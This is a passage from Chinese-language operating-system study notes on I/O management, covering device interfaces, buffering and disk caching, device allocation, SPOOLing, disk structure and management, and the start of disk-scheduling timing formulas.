<p>隐藏了磁盘的二维结构。在二维结构中，每个扇区的地址需要用磁道号和扇区号来表示。块设备接口将磁盘的所有扇区从 <code>0</code> 到 <code>n - 1</code> 依次编号，这样，就将二维结构变为一种线性序列。</p>
<p>将抽象命令映射为低层操作。块设备接口支持上层发来的对文件或设备的打开、读、写和关闭等抽象命令，该接口将上述命令映射为设备能识别的较低层的具体操作。</p>
<p>内存映射接口通过内存的字节数组来访问磁盘，而不提供读/写磁盘操作。映射文件到内存的系统调用返回包含文件副本的一个虚拟内存地址。只在需要访问内存映像时，才由虚拟存储器实际调页。内存映射文件的访问如同内存读写一样简单，极大地方便了程序员。</p>
</li>
<li>
<p><strong>网络设备接口</strong></p>
<p>现代操作系统都提供面向网络的功能，因此还需要提供相应的网络软件和网络通信接口，使计算机能够通过网络与网络上的其他计算机进行通信或上网浏览。</p>
<p>许多操作系统提供的网络 <code>I/O</code> 接口为网络套接字接口，套接字接口的系统调用使应用程序创建的本地套接字连接到远程应用程序创建的套接字，通过此连接发送和接收数据。</p>
</li>
<li>
<p><strong>阻塞/非阻塞 I/O</strong></p>
<p>操作系统的 <code>I/O</code> 接口还涉及两种模式：阻塞和非阻塞。</p>
<p>阻塞 <code>I/O</code> 是指当用户进程调用 <code>I/O</code> 操作时，进程就被阻塞，需要等待 <code>I/O</code> 操作完成，进程才被唤醒继续执行。非阻塞 <code>I/O</code> 是指用户进程调用 <code>I/O</code> 操作时，不阻塞该进程，该 <code>I/O</code> 调用返回一个错误返回值，通常，进程需要通过轮询的方式来查询 <code>I/O</code> 操作是否完成。</p>
<p>大多数操作系统提供的 <code>I/O</code> 接口都是采用阻塞 <code>I/O</code>。</p>
</li>
</ul>
<h3> 设备独立性软件</h3>
<h4> 与设备无关的软件</h4>
<p>与设备无关的软件是 <code>I/O</code> 系统的最高层软件，它的下层是设备驱动程序，其间的界限因操作系统和设备的不同而有所差异。比如：一些本应由设备独立性软件实现的功能，也可能放在设备驱动程序中实现。这样的差异主要是出于对操作系统、设备独立性软件和设备驱动程序运行效率等多方面因素的权衡。总体而言，设备独立性软件包括执行所有设备公有操作的软件。</p>
<h4> 高速缓存与缓冲区</h4>
<ol>
<li>
<p><strong>磁盘高速缓存（Disk Cache）</strong></p>
<p>操作系统中使用磁盘高速缓存技术来提高磁盘的 <code>I/O</code> 速度，对访问高速缓存要比访问原始磁盘数据更为高效。例如：正在运行进程的数据既存储在磁盘上，又存储在物理内存上，也被复制到 CPU 的二级和一级高速缓存中。不过，磁盘高速缓存技术不同于通常意义下的介于 CPU 与内存之间的小容量高速存储器，而是指利用内存中的存储空间来暂存从磁盘中读出的一系列盘块中的信息。因此，<strong>磁盘高速缓存逻辑上属于磁盘，物理上则是驻留在内存中的盘块。</strong></p>
<p>高速缓存在内存中分为两种形式：一种是在内存中开辟一个单独的空间作为磁盘高速缓存，大小固定；另一种是把未利用的内存空间作为一个缓冲池，供请求分页系统和磁盘 <code>I/O</code> 时共享。</p>
</li>
<li>
<p><strong>缓冲区（Buffer）</strong></p>
<p>在设备管理子系统中，引入缓冲区的目的主要如下：</p>
<ul>
<li>缓和 CPU 与 <code>I/O</code> 设备间速度不匹配的矛盾</li>
<li>减少对 CPU 的中断频率，放宽对 CPU 中断响应时间的限制</li>
<li>解决基本数据单元大小（即数据粒度）不匹配的问题</li>
<li>提高 CPU 和 <code>I/O</code> 设备之间的并行性</li>
</ul>
<p>其实现方法如下：</p>
<ul>
<li>采用硬件缓冲器，但由于成本太高，除一些关键部位外，一般不采用硬件缓冲器</li>
<li>采用缓冲区（位于内存区域）</li>
</ul>
<p>根据系统设置缓冲器的个数，缓冲技术可以分为如下几种：</p>
<ul>
<li>
<p><strong>单缓冲</strong></p>
<p>在主存中设置一个缓冲区。当设备和处理机交换数据时，先将数据写入缓冲区，然后需要数据的设备或处理机从缓冲区取走数据，在缓冲区写入或取出的过程中，另一方需等待。</p>
<p>在块设备输入时，假定从磁盘把一块数据输入到缓冲区的时间为 T，操作系统将该缓冲区中的数据传送到用户区的时间为 M，而 CPU 对这一块数据处理的时间为 C。</p>
<p>在研究每块数据的处理时间时，有一个技巧：假设一种初始状态，然后计算下一次到达相同状态时所需要的时间，就是处理一块数据所需要的时间。在单缓冲中，这种初始状态为：工作区是满的，缓冲区是空的。</p>
</li>
<li>
<p><strong>双缓冲</strong></p>
<p>根据单缓冲的特点，CPU 在传送时间 M 内处于空闲状态，由此引入双缓冲。<code>I/O</code> 设备输入数据时先装填到缓冲区 1，在缓冲区 1 填满后才开始装填缓冲区 2，与此同时处理机可以从缓冲区 1 中取出数据送入用户进程，当缓冲区 1 中的数据处理完后，若缓冲区 2 已填满，则处理机又从缓冲区 2 中取出数据送入用户进程，而 <code>I/O</code> 设备又可以装填缓冲区 1。注意，必须等缓冲区 2 充满才能让处理机从缓冲区 2 取出数据。双缓冲机制提高了处理机和输入设备的并行程度。</p>
</li>
<li>
<p><strong>循环缓冲</strong></p>
<p>包含多个大小相等的缓冲区，每个缓冲区中有一个链接指针指向下一个缓冲区，最后一个缓冲区指针指向第一个缓冲区，多个缓冲区构成一个环形。</p>
<p>循环缓冲用于输入/输出时，还需要有两个指针 <code>in</code> 和 <code>out</code>。对输入而言，首先要从设备接收数据到缓冲区中，<code>in</code> 指针指向可以输入数据的第一个空缓冲区；当运行进程需要数据时，从循环缓冲区中取一个装满数据的缓冲区，并从此缓冲区中提取数据，<code>out</code> 指针指向可以提取数据的第一个满缓冲区。输出则正好相反。</p>
</li>
<li>
<p><strong>缓冲池</strong></p>
<p>由多个系统公用的缓冲区组成，缓冲区按其使用状况可以形成三个队列：空缓冲队列、装满输入数据的缓冲队列（输入队列）和装满输出数据的缓冲队列（输出队列）。还应具有四种缓冲区：用于收容输入数据的工作缓冲区、用于提取输入数据的工作缓冲区、用于收容输出数据的工作缓冲区及用于提取输出数据的工作缓冲区。</p>
<p>当输入进程需要输入数据时，便从空缓冲队列的队首摘下一个空缓冲区，把它作为收容输入工作缓冲区，然后把输入数据输入其中，装满后再将它挂到输入队列队尾。当计算进程需要输入数据时，便从输入队列取得一个缓冲区作为提取输入工作缓冲区，计算进程从中提取数据，数据用完后再将它挂到空缓冲队列尾。当计算进程需要输出数据时，便从空缓冲队列的队首取得一个空缓冲区，作为收容输出工作缓冲区，当其中装满输出数据后，再将它挂到输出队列队尾。当要输出时，由输出进程从输出队列中取得一个装满输出数据的缓冲区，作为提取输出工作缓冲区，当数据提取完后，再将它挂到空缓冲队列的队尾。</p>
</li>
</ul>
</li>
<li>
<p><strong>高速缓存与缓冲区的对比</strong></p>
<p>高速缓存是可以保存数据拷贝的高速存储器，访问高速缓存比访问原始数据更高效，速度更快。高速缓存和缓冲区的对比如下：</p>
<ul>
<li>
<p><strong>相同点：</strong></p>
<ul>
<li>都介于高速设备和低速设备之间</li>
</ul>
</li>
<li>
<p><strong>不同点：</strong></p>
<ul>
<li>
<p><strong>存放数据</strong></p>
<ul>
<li><strong>高速缓存</strong>：存放的是低速设备上的某些数据的复制数据，即高速缓存上有的，低速设备上面必然有</li>
<li><strong>缓冲区</strong>：存放的是低速设备传递给高速设备的数据（或相反），而这些数据在低速设备（或高速设备）上却不一定有备份，这些数据再从缓冲区传送到高速设备（或低速设备）</li>
</ul>
</li>
<li>
<p><strong>目的</strong></p>
<ul>
<li><strong>高速缓存</strong>：高速缓存存放的是高速设备经常要访问的数据，若高速设备要访问的数据不在高速缓存中，则高速设备就需要访问低速设备</li>
<li><strong>缓冲区</strong>：高速设备和低速设备的通信都要经过缓冲区，高速设备永远不会直接去访问低速设备</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<h4> 设备分配与回收</h4>
<ol>
<li>
<p><strong>设备分配概述</strong></p>
<p>设备分配是指根据用户的 <code>I/O</code> 请求分配所需的设备。分配的总原则是充分发挥设备的使用效率，尽可能地让设备忙碌，又要避免由于不合理的分配方法造成进程死锁。从设备的特性来看，采用下述三种使用方式的设备：</p>
<ul>
<li><strong>独占设备</strong>：进程分配到独占设备后，便由其独占，直至该进程释放该设备</li>
<li><strong>共享设备</strong>：对于共享设备，可同时分配给多个进程，通过分时共享使用</li>
<li><strong>虚拟设备</strong>：以 SPOOLing 方式使用外部设备。SPOOLing 技术实现了虚拟设备功能，可以将设备同时分配给多个进程。这种技术实质上就是实现了对设备的 <code>I/O</code> 操作的批处理</li>
</ul>
</li>
<li>
<p><strong>设备分配的数据结构</strong></p>
<p>设备分配依据的主要数据结构有设备控制表（DCT）、控制器控制表（COCT）、通道控制表（CHCT）和系统设备表（SDT），各数据结构功能如下：</p>
<ul>
<li><strong>设备控制表（DCT）</strong>：一个设备控制表就表征一个设备，而这个控制表中的表项就是设备的各个属性。凡因请求本设备而未得到满足的进程，应将其 PCB 按某种策略排成一个设备请求队列，设备队列的队首指针指向该请求队列队首 PCB</li>
<li><strong>控制器控制表（COCT）</strong>：设备控制器控制设备与内存交换数据，而设备控制器又需要请求通道为它服务，因此每个 COCT 有一个表项存放指向相应通道控制表（CHCT）的指针</li>
<li><strong>通道控制表（CHCT）</strong>：一个通道可为多个设备控制器服务，因此 CHCT 中必定有一个指针，指向一个表，这个表上的信息表达的是 CHCT 提供服务的那几个设备控制器。CHCT 与 COCT 的关系是一对多的关系</li>
<li><strong>系统设备表（SDT）</strong>：整个系统只有一张 SDT。它记录已连接到系统中的所有物理设备的情况，每个物理设备占一个表目</li>
</ul>
<p>在多道程序系统中，进程数多于资源数，因此要有一套合理的分配原则，主要考虑的因素有：<code>I/O</code> 设备的固有属性、<code>I/O</code> 设备的分配算法、<code>I/O</code> 设备分配的安全性以及 <code>I/O</code> 设备的独立性。</p>
</li>
<li>
<p><strong>设备分配的策略</strong></p>
<ul>
<li>
<p><strong>设备分配原则</strong>：设备分配应根据设备特性、用户要求和系统配置情况。既要充分发挥设备的使用效率，又要避免造成进程死锁，还要将用户程序和具体设备隔离开</p>
</li>
<li>
<p><strong>设备分配方式</strong>：设备分配方式有静态分配和动态分配两种</p>
<ul>
<li><strong>静态分配</strong>：主要用于对独占设备的分配，它在用户作业开始执行前，由系统一次性分配该作业所要求的全部设备、控制器。一旦分配，这些设备、控制器就一直为该作业所占用，直到该作业被撤销。静态分配方式不会出现死锁，但设备的使用效率低</li>
<li><strong>动态分配</strong>：在进程执行过程中根据执行需要进行。当进程需要设备时，通过系统调用命令向系统提出设备请求，由系统按某种策略给进程分配所需要的设备、控制器，一旦用完，便立即释放。这种方式有利于提高设备利用率，但若分配算法使用不当，则有可能造成进程死锁</li>
</ul>
</li>
<li>
<p><strong>设备分配算法</strong>：常用的动态设备分配算法有先请求先分配、优先级高者优先等</p>
</li>
</ul>
<p>对于独占设备，既可以采用动态分配方式，又可以采用静态分配方式，但往往采用静态分配方式。共享设备可被多个进程所共享，一般采用动态分配方式，但在每个 <code>I/O</code> 传输的单位时间内只被一个进程所占有，通常采用先请求先分配和优先级高者优先的分配算法。</p>
</li>
<li>
<p><strong>设备分配的安全性</strong></p>
<p>设备分配的安全性是指设备分配中应防止发生进程死锁。</p>
<ul>
<li><strong>安全分配方式</strong>：每当进程发出 <code>I/O</code> 请求后便进入阻塞态，直到其 <code>I/O</code> 操作完成时才被唤醒。这样，一旦进程已经获得某种设备后便阻塞，不能再请求任何资源，而在它阻塞时也不保持任何资源。其优点是设备分配安全，缺点是 CPU 和 <code>I/O</code> 设备是串行工作的</li>
<li><strong>不安全分配方式</strong>：进程在发出 <code>I/O</code> 请求后仍继续运行，需要时又发出第二个、第三个 <code>I/O</code> 请求等。仅当进程所请求的设备已被另一进程占用时，才进入阻塞态。优点是一个进程可同时操作多个设备，使进程推进迅速；缺点是有可能造成死锁</li>
</ul>
</li>
<li>
<p><strong>逻辑设备名到物理设备名的映射</strong></p>
<p>为了提高设备分配的灵活性和设备的利用率，方便实现 <code>I/O</code> 重定向，引入了设备独立性。设备独立性是指应用程序独立于具体使用的物理设备。</p>
<p>为了实现设备独立性，在应用程序中使用逻辑设备名来请求使用某类设备，在系统中设置一张逻辑设备表（Logical Unit Table，LUT），用于将逻辑设备名映射为物理设备名。LUT 表项包括逻辑设备名、物理设备名和设备驱动程序入口地址；当进程用逻辑设备名来请求分配设备时，系统为它分配一台相应的物理设备，并在 LUT 中建立一个表目，当以后进程再利用该逻辑设备名请求 <code>I/O</code> 操作时，系统通过查找 LUT 来寻找对应的物理设备和驱动程序。</p>
<p>在系统中可采取两种方式设置逻辑设备表：</p>
<ul>
<li><strong>在整个系统中只设置一张 LUT</strong>：这样，所有进程的设备分配情况都记录在同一张 LUT 中，因此不允许 LUT 中具有相同的逻辑设备名，主要适用于单用户系统</li>
<li><strong>为每个用户设置一张 LUT</strong>：每当用户登录时，系统便为该用户建立一个进程，同时也为之建立一张 LUT，并将该表放入进程的 PCB 中</li>
</ul>
</li>
</ol>
<h4> SPOOLing 技术（假脱机技术）</h4>
<p>为了缓和 CPU 的高速性与 <code>I/O</code> 设备低速性之间的矛盾，引入了脱机输入/输出技术，它是操作系统中采用的一项将独占设备改造成共享设备的技术。该技术利用专门的外围控制机，将低速 <code>I/O</code> 设备上的数据传送到高速磁盘上，或者相反。</p>
<ul>
<li>
<p><strong>输入井和输出井</strong></p>
<p>在磁盘上开辟出的两个存储区域。输入井模拟脱机输入时的磁盘，用于收容 <code>I/O</code> 设备输入的数据。输出井模拟脱机输出时的磁盘，用于收容用户程序的输出数据。一个进程的输入（或输出）数据保存为一个文件，所有进程的数据输入（或输出）文件链接成一个输入（或输出）队列。</p>
</li>
<li>
<p><strong>输入缓冲区和输出缓冲区</strong></p>
<p>在内存中开辟的两个缓冲区。输入缓冲区用于暂存由输入设备送来的数据，以后再传送到输入井。输出缓冲区用于暂存从输出井送来的数据，以后再传送到输出设备。</p>
</li>
<li>
<p><strong>输入进程和输出进程</strong></p>
<p>输入/输出进程用于模拟脱机输入/输出时的外围控制机。用户要求的数据从输入设备经过输入缓冲区送到输入井，当 CPU 需要输入数据时，直接从输入井读入内存。用户要求输出的数据先从内存送到输出井，待输出设备空闲时，再将输出井中的数据经过输出缓冲区送到输出设备。</p>
</li>
</ul>
<p>共享打印机是使用 SPOOLing 技术的实例。当用户进程请求打印输出时，SPOOLing 系统同意打印，但是并不真正立即把打印机分配给该进程，而由假脱机管理进程完成两项任务：</p>
<ul>
<li>在磁盘缓冲区中为之申请一个空闲盘块，并将要打印的数据送入其中暂存</li>
<li>为用户进程申请一张空白的用户请求打印表，并将用户的打印要求填入其中，再将该表挂到假脱机文件队列上</li>
</ul>
<p>这两项工作完成后，虽然还没有任何实际的打印输出，但是对于用户进程而言，其打印任务已完成。对用户而言，系统并非立即执行真实的打印操作，而只是立即将数据输出到缓冲区，真正的打印操作是在打印机空闲且该打印任务已排在等待队列队首时进行的。</p>
<p><strong>SPOOLing 系统的特点如下：</strong></p>
<ul>
<li>提高了 <code>I/O</code> 的速度，将对低速 <code>I/O</code> 设备执行的 <code>I/O</code> 操作演变为对磁盘缓冲区中数据的存取，如同脱机输入/输出一样，缓和了 CPU 和低速 <code>I/O</code> 设备之间的速度不匹配的矛盾</li>
<li>将独占设备改造为共享设备，在假脱机打印机系统中，实际上并没有为任何进程分配设备</li>
<li>实现了虚拟设备功能，对每个进程而言，它们都认为自己独占了一个设备</li>
</ul>
<p>SPOOLing 技术是一种以空间换时间的技术，很容易理解它牺牲了空间，因为它开辟了磁盘上的空间作为输入井和输出井，但它又如何节省时间呢？</p>
<p>从前述内容了解到，磁盘是一种高速设备，在与内存交换数据的速度上优于打印机、键盘、鼠标等中低速设备。试想一下，若没有 SPOOLing 技术，CPU 要向打印机输出要打印的数据，打印机的打印速度比较慢，CPU 就必须迁就打印机，在打印机把数据打印完后才能继续做其他的工作，浪费了 CPU 的不少时间。在 SPOOLing 技术下，CPU 要打印机打印的数据可以先输出到磁盘的输出井中（这个过程由假脱机进程控制），然后做其他的事情。若打印机此时被占用，则 SPOOLing 系统就会把这个打印请求挂到等待队列上，待打印机有空时再把数据打印出来。向磁盘输出数据的速度比向打印机输出数据的速度快，因此就节省了时间。</p>
<h4> 设备驱动程序接口</h4>
<p>如果每个设备驱动程序与操作系统的接口都不同，那么每次出现一个新设备时，都必须为此修改操作系统。因此，要求每个设备驱动程序与操作系统之间都有着相同或相近的接口。这样会使得添加一个新设备驱动程序变得很容易，同时也便于开发人员编制设备驱动程序。</p>
<p>对于每种设备类型，例如：磁盘，操作系统都要定义一组驱动程序必须支持的函数。对磁盘而言，这些函数自然包含读、写、格式化等。驱动程序中通常包含一张表格，这张表格具有针对这些函数指向驱动程序自身的指针。装载驱动程序时，操作系统记录这个函数指针表的地址，所以当操作系统需要调用一个函数时，它可以通过这张表格发出间接调用。这个函数指针表定义了驱动程序与操作系统其余部分之间的接口。给定类型的所有设备都必须服从这一要求。</p>
<p>与设备无关的软件还要负责将符号化的设备名映射到适当的驱动程序上。例如：在 UNIX 中，设备名 <code>/dev/disk0</code> 唯一确定了一个特殊文件的 <code>i</code> 结点，这个 <code>i</code> 结点包含了主设备号（用于定位相应的驱动程序）和次设备号（用来确定要读写的具体设备）。</p>
<p>在 UNIX 和 Windows 中，设备是作为命名对象出现在文件系统中的，因此针对文件的常规保护规则也适用于 <code>I/O</code> 设备。系统管理员可以为每个设备设置适当的访问权限。</p>
<h3> 磁盘和固态硬盘</h3>
<h4> 磁盘</h4>
<p>磁盘（Disk）是由表面涂有磁性物质的物理盘片，通过一个称为 <strong>磁头</strong> 的导体线圈从磁盘存取数据。在读/写操作期间，磁头固定，磁盘在下面高速旋转。如下图所示，磁盘盘面上的数据存储在一组同心圆中，称为 <strong>磁道</strong>。每个磁道与磁头一样宽，一个盘面有上千个磁道。磁道又划分为几百个 <strong>扇区</strong>，每个扇区固定存储大小，一个扇区称为一个 <strong>盘块</strong>。相邻磁道及相邻扇区间通过一定的间隙分隔开，以避免精度错误。注意，由于扇区按固定圆心角度划分，所以密度从最外道向里道增加，磁盘的存储能力受限于最内道的最大记录密度。</p>
<figure><figcaption>磁盘</figcaption></figure>
<p>磁盘安装在一个磁盘驱动器中，它由磁头臂、用于旋转磁盘的主轴和用于数据输入/输出的电子设备组成。如下图所示，多个盘片垂直堆叠，组成磁盘组，每个盘面对应一个磁头，所有磁头固定在一起，与磁盘中心的距离相同且一起移动。所有盘片上相对位置相同的磁道组成柱面。扇区是磁盘可寻址的最小单位，磁盘上能存储的物理块数目由扇区数、磁道数及磁盘面数决定，磁盘地址用 “柱面号 · 盘面号 · 扇区号” 表示。</p>
<figure><figcaption>磁盘驱动器</figcaption></figure>
<p><strong>磁盘按不同的方式可分为若干类型：</strong></p>
<ul>
<li><strong>固定头磁盘</strong>：磁头相对于盘片的径向方向固定，每个磁道一个磁头</li>
<li><strong>活动头磁盘</strong>：磁头可移动，磁头臂可来回伸缩定位磁道</li>
<li><strong>固定盘磁盘</strong>：磁盘永久固定在磁盘驱动器内</li>
<li><strong>可换盘磁盘</strong>：可移动和替换</li>
</ul>
<p>操作系统中几乎每介绍一类资源及其管理时，都要涉及一类调度算法。用户访问文件，需要操作系统的服务，文件实际上存储在磁盘中，操作系统接收用户的命令后，经过一系列的检验访问权限和寻址过程后，最终都会到达磁盘，控制磁盘把相应的数据信息读出或修改。当有多个请求同时到达时，操作系统就要决定先为哪个请求服务，这就是 <a href="#%E7%A3%81%E7%9B%98%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95">磁盘调度算法</a> 要解决的问题。</p>
<h4> 磁盘的管理</h4>
<ol>
<li>
<p><strong>磁盘初始化</strong></p>
<p>一个新的磁盘只是一个磁性记录材料的空白盘。在磁盘可以存储数据之前，必须将它分成扇区，以便磁盘控制器能够进行读写操作，这个过程称为 <strong>低级格式化</strong>（或称物理格式化）。低级格式化为每个扇区使用特殊的数据结构，填充磁盘。每个扇区的数据结构通常由头部、数据区域（通常为 <code>512B</code> 大小）和尾部组成。头部和尾部包含了一些磁盘控制器的使用信息。</p>
<p>大多数磁盘在工厂时作为制造过程的一部分就已低级格式化，这种格式化能够让制造商测试磁盘，并且初始化逻辑块号到无损磁盘扇区的映射。对于许多磁盘，当磁盘控制器低级格式化时，还能指定在头部和尾部之间留下多长的数据区，通常选择 <code>256</code> 或 <code>512</code> 字节等。</p>
</li>
<li>
<p><strong>分区</strong></p>
<p>在可以使用磁盘存储文件之前，操作系统还要将自已的数据结构记录到磁盘上，分为两步：第一步是，将磁盘分为由一个或多个柱面组成的分区（即 C 盘、D 盘等形式的分区），每个分区的起始扇区和大小都记录在磁盘主引导记录的分区表中；第二步是，对物理分区进行逻辑格式化（创建文件系统），操作系统将初始的文件系统数据结构存储到磁盘上，这些数据结构包括空闲空间和已分配的空间以及一个初始为空的目录。</p>
<p>因扇区的单位太小，为了提高效率，操作系统将多个相邻的扇区组合在一起，形成一 <strong>簇</strong>（在 Linux 中称为块）。为了更高效地管理磁盘，一簇只能存放一个文件的内容，文件所占用的空间只能是簇的整数倍；如果文件大小小于一簇（甚至是 <code>0</code> 字节），也要占用一簇的空间。</p>
</li>
<li>
<p><strong>引导块</strong></p>
<p>计算机启动时需要运行一个初始化程序（自举程序），它初始化 CPU、寄存器、设备控制器和内存等，接着启动操作系统。为此，自举程序找到磁盘上的操作系统内核，将它加载到内存，并转到起始地址，从而开始操作系统的运行。</p>
<p>自举程序通常存放在 ROM 中，为了避免改变自举代码而需要改变 ROM 硬件的问题，通常只在 ROM 中保留很小的自举装入程序，而将完整功能的引导程序保存在磁盘的启动块上，启动块位于磁盘的固定位置。具有启动分区的磁盘称为 <strong>启动磁盘</strong> 或系统磁盘。</p>
<p>引导 ROM 中的代码指示磁盘控制器将引导块读入内存，然后开始执行，它可以从非固定的磁盘位置加载整个操作系统，并且开始运行操作系统。下面以 Windows 为例来分析引导过程。</p>
<p>Windows 允许将磁盘分为多个分区，有一个分区为引导分区，它包含操作系统和设备驱动程序。Windows 系统将引导代码存储在磁盘的第 <code>0</code> 号扇区，它称为主引导记录（MBR）。引导首先运行 ROM 中的代码，这个代码指示系统从 MBR 中读取引导代码。除了包含引导代码，MBR 还包含：一个磁盘分区表和一个标志（以指示从哪个分区引导系统）。当系统找到引导分区时，读取分区的第一个扇区，称为 <strong>引导扇区</strong>，并继续余下的引导过程，包括加载各种系统服务。</p>
</li>
<li>
<p><strong>坏块</strong></p>
<p>由于磁盘有移动部件且容错能力弱，因此容易导致一个或多个扇区损坏。部分磁盘甚至在出厂时就有坏块。根据所用的磁盘和控制器，对这些块有多种处理方式。</p>
<p>对于简单磁盘，如采用 IDE 控制器的磁盘，坏块可手动处理，如 MS-DOS 的 <code>Format</code> 命令执行逻辑格式化时会扫描磁盘以检查坏块。坏块在 FAT 表上会标明，因此程序不会使用它们。</p>
<p>对于复杂的磁盘，控制器维护磁盘内的坏块列表。这个列表在出厂低级格式化时就已初始化，并在磁盘的使用过程中不断更新。低级格式化将一些块保留作为备用，操作系统看不到这些块。控制器可以采用备用块来逻辑地替代坏块，这种方案称为 <strong>扇区备用。</strong></p>
<p>对坏块的处理实质上就是用某种机制使系统不去使用坏块。</p>
</li>
</ol>
<h4> 磁盘调度算法</h4>
<p>一次磁盘读写操作的时间由寻找（寻道）时间、旋转延迟时间和传输时间决定。</p>
<ul>
<li>
<p><strong>寻找时间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>s</mi></msub></mrow><annotation encoding="application/x-tex">T_{s}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></strong></p>
<p>活动头磁盘在读写信息前，将磁头移动到指定磁道所需要的时间。这个时间除跨越 <code>n</code> 条磁道的时间外，还包括启动磁臂的时间 <code>s</code>，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>s</mi></msub><mo>=</mo><mi>m</mi><mo>×</mo><mi>n</mi><mo>+</mo><mi>s</mi></mrow><annotation encoding="application/x-tex">T_{s} = m \times n + s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span> 式中，<code>m</code> 是与磁盘驱动器速度有关的常数，约为 <code>0.2ms</code>，磁臂的启动时间约为 <code>2ms</code>。</p>
</li>
<li>
<p><strong>旋转延迟时间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>r</mi></msub></mrow><annotation encoding="application/x-tex">T_{r}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></strong></p>
<p>磁头定位到某一磁道的扇区所需要的时间，设磁盘的旋转速度为 <code>r</code>，则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>r</mi></msub><mo>=</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mn>1</mn><mrow><mn>2</mn><mi>r</mi></mrow></mfrac></mstyle></mrow><annotation encoding="application/x-tex">T_{r} = \dfrac{1}{2r}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span> 对于硬盘，典型的旋转速度为 <code>5400</code> 转/分，相当于一周 <code>11.1ms</code>，则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>r</mi></msub></mrow><annotation encoding="application/x-tex">T_{r}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" 